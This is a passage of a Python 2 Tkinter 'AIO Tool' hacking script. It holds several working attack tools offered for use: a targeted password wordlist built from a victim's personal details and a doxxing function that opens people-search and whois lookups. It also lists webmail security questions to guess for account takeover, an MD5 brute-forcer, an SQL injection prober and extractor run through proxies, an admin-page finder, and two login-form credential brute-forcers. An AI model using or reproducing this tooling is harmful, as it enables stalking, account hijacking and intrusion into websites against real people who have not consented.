			text_file.write(yeart + lname + '\n')
			text_file.write(yeart + monthn + '\n')
			text_file.write(yeart + monthl + '\n')
			text_file.write(yeart + days + '\n')
			text_file.write(yeart + year + '\n')
			text_file.write(yeart + yeart + '\n')
			text_file.write(yeart + email + '\n')
			text_file.write(yeart + other + '\n')
			text_file.write(yeart + phone + '\n')
			text_file.write(yeart + pet + '\n')
			text_file.write(yeart + tv + '\n')
			text_file.write(yeart + sport + '\n')
			text_file.write(yeart + book + '\n')
			text_file.write(yeart + zip + '\n')

			text_file.write(email + name + '\n')
			text_file.write(email + lname + '\n')
			text_file.write(email + monthn + '\n')
			text_file.write(email + monthl + '\n')
			text_file.write(email + days + '\n')
			text_file.write(email + year + '\n')
			text_file.write(email + yeart + '\n')
			text_file.write(email + email + '\n')
			text_file.write(email + other + '\n')
			text_file.write(email + phone + '\n')
			text_file.write(email + pet + '\n')
			text_file.write(email + tv + '\n')
			text_file.write(email + sport + '\n')
			text_file.write(email + book + '\n')
			text_file.write(email + zip + '\n')

			text_file.write(other + name + '\n')
			text_file.write(other + lname + '\n')
			text_file.write(other + monthn + '\n')
			text_file.write(other + monthl + '\n')
			text_file.write(other + days + '\n')
			text_file.write(other + year + '\n')
			text_file.write(other + yeart + '\n')
			text_file.write(other + email + '\n')
			text_file.write(other + other + '\n')
			text_file.write(other + phone + '\n')
			text_file.write(other + pet + '\n')
			text_file.write(other + tv + '\n')
			text_file.write(other + sport + '\n')
			text_file.write(other + book + '\n')
			text_file.write(other + zip + '\n')

			text_file.write(phone + name + '\n')
			text_file.write(phone + lname + '\n')
			text_file.write(phone + monthn + '\n')
			text_file.write(phone + monthl + '\n')
			text_file.write(phone + days + '\n')
			text_file.write(phone + year + '\n')
			text_file.write(phone + yeart + '\n')
			text_file.write(phone + email + '\n')
			text_file.write(phone + other + '\n')
			text_file.write(phone + phone + '\n')
			text_file.write(phone + pet + '\n')
			text_file.write(phone + tv + '\n')
			text_file.write(phone + sport + '\n')
			text_file.write(phone + book + '\n')
			text_file.write(phone + zip + '\n')

			text_file.write(pet + name + '\n')
			text_file.write(pet + lname + '\n')
			text_file.write(pet + monthn + '\n')
			text_file.write(pet + monthl + '\n')
			text_file.write(pet + days + '\n')
			text_file.write(pet + year + '\n')
			text_file.write(pet + yeart + '\n')
			text_file.write(pet + email + '\n')
			text_file.write(pet + other + '\n')
			text_file.write(pet + phone + '\n')
			text_file.write(pet + pet + '\n')
			text_file.write(pet + tv + '\n')
			text_file.write(pet + sport + '\n')
			text_file.write(pet + book + '\n')
			text_file.write(pet + zip + '\n')

			text_file.write(tv + name + '\n')
			text_file.write(tv + lname + '\n')
			text_file.write(tv + monthn + '\n')
			text_file.write(tv + monthl + '\n')
			text_file.write(tv + days + '\n')
			text_file.write(tv + year + '\n')
			text_file.write(tv + yeart + '\n')
			text_file.write(tv + email + '\n')
			text_file.write(tv + other + '\n')
			text_file.write(tv + phone + '\n')
			text_file.write(tv + pet + '\n')
			text_file.write(tv + tv + '\n')
			text_file.write(tv + sport + '\n')
			text_file.write(tv + book + '\n')
			text_file.write(tv + zip + '\n')

			text_file.write(sport + name + '\n')
			text_file.write(sport + lname + '\n')
			text_file.write(sport + monthn + '\n')
			text_file.write(sport + monthl + '\n')
			text_file.write(sport + days + '\n')
			text_file.write(sport + year + '\n')
			text_file.write(sport + yeart + '\n')
			text_file.write(sport + email + '\n')
			text_file.write(sport + other + '\n')
			text_file.write(sport + phone + '\n')
			text_file.write(sport + pet + '\n')
			text_file.write(sport + tv + '\n')
			text_file.write(sport + sport + '\n')
			text_file.write(sport + book + '\n')
			text_file.write(sport + zip + '\n')

			text_file.write(book + name + '\n')
			text_file.write(book + lname + '\n')
			text_file.write(book + monthn + '\n')
			text_file.write(book + monthl + '\n')
			text_file.write(book + days + '\n')
			text_file.write(book + year + '\n')
			text_file.write(book + yeart + '\n')
			text_file.write(book + email + '\n')
			text_file.write(book + other + '\n')
			text_file.write(book + phone + '\n')
			text_file.write(book + pet + '\n')
			text_file.write(book + tv + '\n')
			text_file.write(book + sport + '\n')
			text_file.write(book + book + '\n')
			text_file.write(book + zip + '\n')

			text_file.write(zip + name + '\n')
			text_file.write(zip + lname + '\n')
			text_file.write(zip + monthn + '\n')
			text_file.write(zip + monthl + '\n')
			text_file.write(zip + days + '\n')
			text_file.write(zip + year + '\n')
			text_file.write(zip + yeart + '\n')
			text_file.write(zip + email + '\n')
			text_file.write(zip + other + '\n')
			text_file.write(zip + phone + '\n')
			text_file.write(zip + pet + '\n')
			text_file.write(zip + tv + '\n')
			text_file.write(zip + sport + '\n')
			text_file.write(zip + book + '\n')
			text_file.write(zip + zip + '\n')






			tkMessageBox.showinfo("Generated", "Your Passwords Have Been Generated!")
		#######################################
		# This is the code for the Pipl Search#
		#######################################

	def pipl_dox(self):
			self.firstname = self.pname.get()
			self.lastname = self.plast.get()
			self.emailname = self.pemail.get()
			self.username = self.puser.get()
			self.phonenumber = self.pphone.get()
			self.ipaddress = self.pip.get()

			###################################

			self.piplusernamesearch = 'http://pipl.com/search/?Username=%s&CategoryID=5&Interface=1' % (self.username)
			self.piplphonenumbersearch = 'http://pipl.com/search/?Phone=%s&CategoryID=6&Interface=1' % (self.phonenumber)
			self.piplemailsearch = 'http://pipl.com/search/?Email=%s&CategoryID=4&Interface=1' % (self.emailname)
			self.piplnamesearch = 'http://pipl.com/search/?FirstName=%s&LastName=%s&City=&State=&Country=US&CategoryID=2&Interface=1' % (self.firstname, self.lastname)
			self.iplookup = 'http://www.whois.sc/%s' % (self.ipaddress)

			if self.firstname == '':
				print "No name search will be done"

			elif self.lastname == '':
				print "No name search will be done"

			else :

				webbrowser.open(self.piplnamesearch)

			if self.emailname == '':
				print "No email search will be done"

			else :
				webbrowser.open(self.piplemailsearch)

			if self.username == '':
				print "No username search will be done"

			else :
				webbrowser.open(self.piplusernamesearch)


			if self.phonenumber == '':
				print "No phone number search will be done"

			else :
				webbrowser.open(self.piplphonenumbersearch)


			if self.iplookup == '':
				print "No ip search will be done"

			else :
				webbrowser.open(self.iplookup)
			####################################################
			# Defining the variables for the security questions#
			####################################################
			emailnamf = self.emailname.find("@")
			emailnamee = self.emailname[emailnamf+1:]
			emailnamee = emailnamee.lower()
			######################################################
			# Security questions for many popular email providers#
			######################################################
			if emailnamee == 'yahoo.com':
				print 'Yahoo.com Email Security Questions'
				print ' '
				print ' '
				print 'What is the first name of your favorite uncle?'
				print ' '
				print 'Where did you meet your spouse?'
				print ' '
				print 'What is your oldest cousins name?'
				print ' '
				print 'What is your youngest childs nickname?'
				print ' '
				print 'What is your oldest childs nickname?'
				print ' '
				print 'What is the first name of your oldest niece?'
				print ' '
				print 'What is the first name of your oldest nephew?'
				print ' '
				print 'Where did you spend your honeymoon?'
				print ' '
				print 'Where did you spend your childhood summers?'
				print ' '
				print 'What was the last name of your favorite teacher?'
				print ' '
				print 'What was the last name of your best childhood friend?'
				print ' '
				print 'What was the last name of your first boss?'
				print ' '
				print 'What was your favorite food as a child?'
				print ' '
				print 'What is the name of the hospital were you were born?'
				print ' '
				print 'What is the name of the street which you grew up?'
				print ' '
				print 'What is the name of your favorite sports team?'
				print ' '
				print 'What was your first pets name?'
				print ' '
				print 'What is the name of your favorite book?'
				print ' '
				print 'What is the last name of your favorite musician?'
				print ' '
				print 'who is your all-time favorite movie character'
				print ' '
				print 'What was the make of your first car?'
				print ' '
				print 'What was the make of your first motor cycle?'
				print ' '
				print 'Who is your favorite author?'


			if emailnamee == 'ymail.com':
				print 'Ymail.com Email Security Questions'
				print ' '
				print ' '
				print 'What is the first name of your favorite uncle?'
				print ' '
				print 'Where did you meet your spouse?'
				print ' '
				print 'What is your oldest cousins name?'
				print ' '
				print 'What is your youngest childs nickname?'
				print ' '
				print 'What is your oldest childs nickname?'
				print ' '
				print 'What is the first name of your oldest niece?'
				print ' '
				print 'What is the first name of your oldest nephew?'
				print ' '
				print 'Where did you spend your honeymoon?'
				print ' '
				print 'Where did you spend your childhood summers?'
				print ' '
				print 'What was the last name of your favorite teacher?'
				print ' '
				print 'What was the last name of your best childhood friend?'
				print ' '
				print 'What was the last name of your first boss?'
				print ' '
				print 'What was your favorite food as a child?'
				print ' '
				print 'What is the name of the hospital were you were born?'
				print ' '
				print 'What is the name of the street which you grew up?'
				print ' '
				print 'What is the name of your favorite sports team?'
				print ' '
				print 'What was your first pets name?'
				print ' '
				print 'What is the name of your favorite book?'
				print ' '
				print 'What is the last name of your favorite musician?'
				print ' '
				print 'who is your all-time favorite movie character'
				print ' '
				print 'What was the make of your first car?'
				print ' '
				print 'What was the make of your first motor cycle?'
				print ' '
				print 'Who is your favorite author?'


			if emailnamee == 'rocketmail.com':
				print 'rocketmail(yahoo) Email Security Questions'
				print ' '
				print ' '
				print 'What is the first name of your favorite uncle?'
				print ' '
				print 'Where did you meet your spouse?'
				print ' '
				print 'What is your oldest cousins name?'
				print ' '
				print 'What is your youngest childs nickname?'
				print ' '
				print 'What is your oldest childs nickname?'
				print ' '
				print 'What is the first name of your oldest niece?'
				print ' '
				print 'What is the first name of your oldest nephew?'
				print ' '
				print 'Where did you spend your honeymoon?'
				print ' '
				print 'Where did you spend your childhood summers?'
				print ' '
				print 'What was the last name of your favorite teacher?'
				print ' '
				print 'What was the last name of your best childhood friend?'
				print ' '
				print 'What was the last name of your first boss?'
				print ' '
				print 'What was your favorite food as a child?'
				print ' '
				print 'What is the name of the hospital were you were born?'
				print ' '
				print 'What is the name of the street which you grew up?'
				print ' '
				print 'What is the name of your favorite sports team?'
				print ' '
				print 'What was your first pets name?'
				print ' '
				print 'What is the name of your favorite book?'
				print ' '
				print 'What is the last name of your favorite musician?'
				print ' '
				print 'who is your all-time favorite movie character'
				print ' '
				print 'What was the make of your first car?'
				print ' '
				print 'What was the make of your first motor cycle?'
				print ' '
				print 'Who is your favorite author?'

			if emailnamee == 'hotmail.com':
				print 'Hotmail Security Questions'
				print ' '
				print 'Mothers Birthplace?'
				print ' '
				print 'Best Childhood Friend?'
				print ' '
				print 'Name of First Pet?'
				print ' '
				print 'Favorite Teacher'
				print ' '
				print 'Favorite Historical Person'
				print ' '
				print 'Grandfathers occupation'
				print ' '

			if emailnamee == 'live.com':
				print 'Live(msn) Security Questions'
				print ' '
				print 'Mothers Birthplace?'
				print ' '
				print 'Best Childhood Friend?'
				print ' '
				print 'Name of First Pet?'
				print ' '
				print 'Favorite Teacher'
				print ' '
				print 'Favorite Historical Person'
				print ' '
				print 'Grandfathers occupation'
				print ' '

			if emailnamee == 'msn.com':
				print 'msn Security Questions'
				print ' '
				print 'Mothers Birthplace?'
				print ' '
				print 'Best Childhood Friend?'
				print ' '
				print 'Name of First Pet?'
				print ' '
				print 'Favorite Teacher'
				print ' '
				print 'Favorite Historical Person'
				print ' '
				print 'Grandfathers occupation'
				print ' '

			if emailnamee == 'fbi.gov':
				print 'msn Security Questions'
				print ' '
				print 'Mothers Birthplace?'
				print ' '
				print 'Best Childhood Friend?'
				print ' '
				print 'Name of First Pet?'
				print ' '
				print 'Favorite Teacher'
				print ' '
				print 'Favorite Historical Person'
				print ' '
				print 'Grandfathers occupation'
				print ' '
			if emailnamee == 'gmail.com':
				print 'Gmail Security Questions.'
				print ' '
				print 'What is your primary frequent flyer number?'
				print ' '
				print 'What is your library card number?'
				print ' '
				print 'What was your first phone number?'
				print ' '
				print 'What was your first teachers name?'
				print ' '
			if emailnamee == 'aol.com':
				print 'Aol Security Questions.'
				print ' '
				print 'What is your primary frequent flyer number?'
				print ' '
				print 'What is your library card number?'
				print ' '
				print 'In which city did your parents meet?'
				print ' '
				print 'In what year was your mother born?'
				print ' '
				print 'What was your favorite childhood cartoon?'
				print ' '
				print 'What was your favorite childhood book?'
				print ' '
				print 'In what year was your father born?'
				print ' '
				print 'What was your childhood nickname?'
				print ' '
				print 'What is your grandmothers first name?'
				print ' '
				print 'What is your fathers middle name?'
				print ' '
				print 'In what city were you born?'
				print ' '
				print 'What is your mothers maiden name?'
				print ' '
				print 'What was the name of your first pet?'

			if emailnamee == 'aim.com':
				print 'Aol Security Questions.'
				print ' '
				print 'What is your primary frequent flyer number?'
				print ' '
				print 'What is your library card number?'
				print ' '
				print 'In which city did your parents meet?'
				print ' '
				print 'In what year was your mother born?'
				print ' '
				print 'What was your favorite childhood cartoon?'
				print ' '
				print 'What was your favorite childhood book?'
				print ' '
				print 'In what year was your father born?'
				print ' '
				print 'What was your childhood nickname?'
				print ' '
				print 'What is your grandmothers first name?'
				print ' '
				print 'What is your fathers middle name?'
				print ' '
				print 'In what city were you born?'
				print ' '
				print 'What is your mothers maiden name?'
				print ' '
				print 'What was the name of your first pet?'
	#######################
	# The hash bruteforcer#
	#######################

	def brute_att(self):

		alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890ABCEDFGHIJKLMNOPQRSTUVWXYZ'

		min = 6
		max = 12
		i = 2
		total = 20000
		string=''

		input = self.hash.get()

		for count in xrange(1):
			while i == 2:
				for x in random.sample(alphabet,random.randint(min,max)):


					string+=x


				hashs = string
				hash = hashlib.md5()
				hash.update(hashs)
				hash = hash.hexdigest()
				string = ''
				# Looks to see if the generated hash matches the entered hash
				# If so, it prints the original string that was encrypted#
				if input == hash:
					print hashs
					raw_input()

	def zip_search(self):
			zip = self.zip.get()
			# Uses it to convert the url into a custom one.#
			web = 'http://www.melissadata.com/lookups/ZipCityPhone.asp?InData=%s&submit=Search' % (zip)

			page = urllib.urlopen(web)
			text = page.read().decode("utf8")
			# The text.find is inside the source.#
			# Start_of_mod is the beginning '>state the source#
			# End_of_mod shows where the text we want ends#

			where = text.find('>State')
			start_of_state = where + 29
			end_of_state = start_of_state + 14
			# Combines Start of mod and End of mod, to create a string #
			state = text[start_of_state:end_of_state]
			# Quite obviously prints out that string#

			where = text.find('USPS')
			start_of_city = where + 47
			end_of_city = start_of_city + 30
			city = text[start_of_city:end_of_city]
			# Html Parsing#
			state = (state).replace('</','')
			state = (state).replace('<', '')
			state = (state).replace('b>','')

			city = (city).replace('</','')
			print(city).title()
			print ' '
			print(state).title()
	def p_search(self):

			phone = self.ph.get()
			#################################################
			# Uses it to convert the url into a custom one. #
			#################################################
			web = 'http://www.phonelookup.com/1/%s' % (phone)

			page = urllib.urlopen(web)

			text = page.read().decode("utf8")
			###################################
			# Extracts the phone look-up info #
			###################################
			where = text.find('title')

			start_of_phone = where + 6
			end_of_phone = start_of_phone + 67

			phones = text[start_of_phone:end_of_phone]
			########################################
			# Parses the html to remove stray code #
			########################################
			phones = (phones).replace('</title>','')
			print phones

	def V4_Brute(self):
		proxy = self.proxies.get()
		url = self.urlb.get()
		file1 = self.outf.get()

		text_file=open('Tables.txt', 'r')
		proxies = {'http': proxy}
		for line in text_file:
			string = line
			url = url + '%s--' % (string)


			tex = urllib.FancyURLopener(proxies)
			text = tex.read()

			where = text.find('Warning')
			start_of_info = where
			end = where + 7
			end_of_info = end
			info = text[start_of_info:end_of_info]

			where1 = text.find('404')
			start_of_info= where1
			end = where + 3
			end_of_info = end
			info1 = text[start_of_info:end_of_info]

			where2 = text.find('error')
			start_of_info= where2
			end = where + 5
			end_of_info = end
			info2 = text[start_of_info:end_of_info]

			where3 = text.find('Failure To Connect To Web Server')
			start_of_info= where3
			end = where3 + 32
			end_of_info = end
			info3 = text[start_of_info:end_of_info]

			where4 = text.find('DNS')
			start_of_info= where4
			end = where4 + 3
			end_of_info = end
			info4 = text[start_of_info:end_of_info]

			where5 = text.find("Table")
			start_of_info= where5
			end = where5 + 5
			end_of_info = end
			info5 = text[start_of_info:end_of_info]

			where6 = text.find("SQL")
			start_of_info= where6
			end = where6 + 3
			end_of_info = end
			info6 = text[start_of_info:end_of_info]

			where7 = text.find("Access denied")
			start_of_info= where7
			end = where7 + 23
			end_of_info = end
			info7 = text[start_of_info:end_of_info]







			print info7
			text_filee=open(file1,'a')
			text_filee.write(info + info1 + info2 + info3 + info4 + info6 + info5 + info7 + ': ' + string)


			url = url.replace(string +'--','')
			string = ''
	def find_adminp(self):
		url = self.urlb.get()


		text_file = open("Adminpages.txt",'r')
		for line in text_file:
			string = line
			url = url + (string)




			tex = urllib.urlopen(url)
			text = tex.read()

			where = text.find('Admin')
			start_of_info = where
			end = where + 5
			end_of_info = end
			info = text[start_of_info:end_of_info]

			where1 = text.find('Administrator')
			start_of_info = where
			end = where1 + 13
			end_of_info = end
			info1 = text[start_of_info:end_of_info]

			where2 = text.find('Administrative')
			start_of_info = where2
			end = where2 + 14
			end_of_info = end
			info2 = text[start_of_info:end_of_info]

			print string + ':  ' + info + info1 + info2

			text_filee=open("Adminpage.txt","a")
			text_filee.write(string + ':' + info + info1 + info2)
	def sql_data(self):
		class sql:
				######################################################
				# Taking the users input for the variable to start at#
				######################################################
			i = 5
			proxy = self.proxies.get()
			url = self.urlb.get()
			file = self.outf.get()

			# Defining the proxies#
			proxy = 'http://' + proxy
			proxies = {' ':proxy}

			# The code to extract the html##


			num = self.num.get()

			num1 = '0'
			num2 = '0'

			i = 0
			while i == 0:

					num1 = float(num) / float(num) + float(num2)
					num2 = num1
					num1 = str(num1)
					num = str(num)
					num1 = num1.replace('.0','')
					print num1

					url =  url + '%s,1--' % (num1)
					page = urllib.FancyURLopener(proxies)
					tex = page.open(url)
					text = tex.read()
			############################
			# Start of the html parsing#
			############################
					where = text.find('zeeee')
					start_of_info = where + 5
					end = text.find('bec')
					end_of_info = end
					info = text[start_of_info:end_of_info]

					data_file=open(file + '.txt', 'a')
					data_file.write(info + '\n')
					url = url.replace(num1 + ',1--','')
					print url

					if num1 == num:
						break
	def user_brute(self):
		error = self.error.get()
		word_file = self.wordfile.get()
		user_id = self.userid.get()
		pass_id = self.passid.get()
		pass1 = self.pass1.get()
		host = self.host.get()
		user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)'
		headers = {'User-Agent': user_agent}



		word_pos = 1

		file = open(word_file, 'r')
		word_list = file.read().split('\n')
		file.close


		for word in word_list:
			form = {user_id:word, pass_id:pass1}

			print 'Trying password: %s,%s (%d/%d)' % (word,pass1, word_pos, len(word_list))
			word_pos = word_pos + 1

			data = urllib.urlencode(form)
			request = urllib2.Request(host, data, headers)
			response = urllib2.urlopen(request)

			if not re.search(error, response.read()):
				print 'Login Combination: [%s:%s]' % (word, pass1)
				save_combo = open('login comination.txt', 'a')
				save_combo.write(word + ':' + pass1)
				save_combo.close



			if __name__ == '__user_brute__':
				user_brute()
	def html_brute(self):
		error = self.error.get()
		username = self.pass1.get()
		host = self.host.get()
		word_file = self.wordfile.get()
		userid = self.userid.get()
		passid = self.passid.get()



		user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)'
		headers = {'User-Agent': user_agent}


		word_pos = 1

		file = open(word_file, 'r')
		word_list = file.read().split('\n')
		file.close

		for word in word_list:
			form = {userid: username, passid:word}

			print 'Trying password: %s (%d/%d)' % (word, word_pos, len(word_list))
			word_pos = word_pos + 1

			data = urllib.urlencode(form)
			request = urllib2.Request(host, data, headers)
			response = urllib2.urlopen(request)

			if not re.search(error, response.read()):
				print 'Login Combination: [%s:%s]' % (username, word)
				save_combo = open('login comination.txt', 'w')
				save_combo.write(username + ':' + word)
				save_combo.close
				break

	if __name__ == '__html_brute__':
		html_brute()

###################################################
# Normal code that all my Tkinter scripts end with#
###################################################


root = Tk()

root.title("AIO Tool")


doxx = Doxx(root)

root.mainloop()
